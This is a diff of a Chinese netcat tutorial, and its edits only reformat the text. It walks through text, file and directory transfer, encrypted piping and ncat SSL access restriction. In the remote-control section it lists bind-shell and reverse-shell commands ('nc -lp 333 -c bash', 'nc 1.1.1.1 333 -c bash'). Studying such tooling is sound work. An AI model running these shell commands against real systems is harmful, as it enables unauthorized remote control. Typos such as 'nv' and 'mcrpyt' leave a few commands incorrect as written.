@@ -9,22 +9,28 @@ NC-NETCAT
 作为客户端使用
 
 ::
+
    nv -vn <host_ip> <port>
    nc -vn 1.1.1.1 110
 
 2. 传输文本信息
 ------------------------------------------------------------
 
-* 作为客户端使用 ::
+* 作为客户端使用
+
+::
 
   nc -nv <server_ip> <port>
   ls -l | nc -nv <server_ip> <port>
 
-* 作为服务端使用 ::
+* 作为服务端使用
+
+::
 
   nc -l -p <port>
 
 应用场景: **电子取证**
+
   #. 取证机器启动服务器监听 `nc -l -p 4444`
   #. 被取证端启动客户端， 将收集到的文本信息传输给取证机器
      ``ls -l | nc -nv 172.31.225.210 4444``
@@ -39,10 +45,12 @@ NC-NETCAT
 #. 传输文件
 
    两种应用场景: 文件的侦听端口和传输方向
+
+::
    
    A: nc -lp 333 > 1.mp4
    B: nc -nv host_A_ip < 1.mp4 -q 1
-   
+
    A: nc -lp 333 < 1.mp4 -q 1
    B: nc -nv host_A_ip 333 > 1.mp4
    
@@ -51,11 +59,13 @@ NC-NETCAT
 #. 传输目录(结合其它命令)
 
    A: tar -cvf - music/ | nc -lp 333 -q 1
+
    B: nc -nv 1.1.1.1 333 | tar -xvf -
 
 #. 加密传文件
 
    A: nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > 1.mp4
+
    B: mcrpyt --flush -Fbq -a rijndael-256 -m ecb < a.mp4 | nc -nv 1.1.1.1 333 -q 1
 
 4. 流媒体服务器
@@ -83,10 +93,12 @@ NC-NETCAT
 ------------------------------------------------------------
 两个方向的控制类比于, 主动控制和被动控制
 #. 正向
+
    A: nc -lp 333 -c bash
    B: nc 1.1.1.1 333
 
 #. 反向
+
    A: nc -lp 333
    B: nc 1.1.1.1 333 -c bash
 
@@ -97,9 +109,13 @@ NC-NETCAT
 
 #. nc 缺乏加密和身份验证的能力
 #. ncat 包含于 nmap 工具包中, ncat 比 nc 多出了安全验证能力;
-#. 案例: 限制基于源IP地址的连接 ::
+#. 案例: 限制基于源IP地址的连接
+
+::
+
      A: ncat -c bash --allow 172.31.225.75 -vnl 333 --ssl
         --allow 仅允许 172.31.225.75 连接
      B: ncat -nv 172.31.225.72 333 --ssl
 
 #. 不同系统/平台的nc参数功能不尽相同
+
